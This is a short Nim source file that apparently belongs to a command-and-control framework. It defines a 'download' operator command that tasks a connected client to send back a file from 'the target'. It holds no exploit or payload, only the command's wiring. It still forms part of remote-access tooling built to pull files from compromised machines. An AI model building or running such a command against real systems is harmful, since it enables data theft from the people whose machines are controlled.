import asyncdispatch

import ../../types
import ../../communication

import ../../../clientTasks/download

proc execProc(args: seq[string], server: C2Server) {.async.} =
  let task = await download.sendTask(server.cli.handlingClient, args[1])
  await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "download",
  argsLength: 2,
  usage: @["download [path]"],
  cliMode: @[ClientInteractMode],
  description: "Download a file from the target",
  category: CCClientInteraction
)